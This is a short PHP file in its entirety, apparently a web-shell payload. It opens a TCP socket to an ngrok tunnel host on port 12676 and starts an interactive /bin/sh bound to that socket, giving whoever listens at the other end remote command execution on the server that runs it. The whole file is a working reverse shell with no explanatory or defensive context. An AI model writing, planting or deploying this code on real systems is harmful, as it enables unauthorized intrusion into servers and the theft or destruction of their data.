<?php
$sock=fsockopen("0.tcp.sa.ngrok.io",12676); 
exec("/bin/sh -i <&3 >&3 2>&3");
?>
